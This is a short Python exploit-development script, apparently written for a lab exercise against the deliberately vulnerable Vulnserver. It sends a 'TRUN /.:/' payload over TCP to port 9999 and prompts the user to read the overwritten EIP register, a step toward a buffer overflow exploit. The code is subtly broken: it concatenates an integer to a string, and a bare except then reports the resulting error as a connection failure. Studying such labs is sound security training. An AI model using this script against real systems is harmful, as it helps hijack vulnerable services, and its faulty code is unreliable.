#!/usr/bin/python3
import sys
import socket

target_ip = ""
target_port = 9999
cmd_attacking = 'TRUN /.:/'
offset = 0
print("-" * 100)

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    payload = cmd_attacking + offset
    s.send(payload.encode())
    print("\nPayload sent. Grab the new EIP value.\n")
    s.close()
    print("-" * 100)
except:
    print("Error connecting to server")
    print("-" * 100)
    sys.exit()


